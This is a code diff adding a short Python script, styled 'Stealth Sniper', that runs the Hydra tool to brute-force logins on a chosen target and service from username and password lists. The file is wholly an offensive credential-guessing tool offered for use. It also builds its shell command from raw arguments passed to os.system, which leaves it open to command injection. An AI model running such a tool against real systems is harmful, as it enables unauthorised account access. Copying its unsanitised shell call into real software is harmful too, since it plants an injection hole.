@@ -1,0 +1,26 @@
+import os
+import sys
+
+# --- Outlaw Ninja: Stealth Sniper Python Module ---
+# Purpose: Automated credential testing with stealth logic
+
+def stealth_scan(target, service, user_list, pass_list):
+    print(f"[!] Initializing Stealth Sniper on {target} for {service}...")
+    
+    # Custom Hydra command string with our optimized flags
+    cmd = f"hydra -L {user_list} -P {pass_list} -t 4 -V -f {target} {service}"
+    
+    try:
+        os.system(cmd)
+    except Exception as e:
+        print(f"[-] Error executing stealth scan: {e}")
+
+if __name__ == "__main__":
+    if len(sys.argv) < 5:
+        print("Usage: python3 stealth_sniper.py <target> <service> <userlist> <passlist>")
+    else:
+        target = sys.argv[1]
+        service = sys.argv[2]
+        user_list = sys.argv[3]
+        pass_list = sys.argv[4]
+        stealth_scan(target, service, user_list, pass_list)
